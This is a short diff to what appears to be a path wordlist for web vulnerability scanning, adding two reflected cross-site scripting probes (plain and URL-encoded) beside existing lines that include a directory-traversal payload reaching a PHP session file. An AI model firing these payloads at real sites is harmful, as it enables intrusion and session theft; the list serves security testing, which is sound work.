@@ -17,3 +17,5 @@
 /Data/Log/18_06_20.log
 /GreenCMS-beta/Data/Log/18_06_20.log
 /index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k
+/top.html?page=main&productboardtype=<script>alert("Raif Berkay Dincel");</script>
+/top.html?page=main&productboardtype=%3Cscript%3Ealert(%22Raif%20Berkay%20Dincel%22);%3C/script%3E
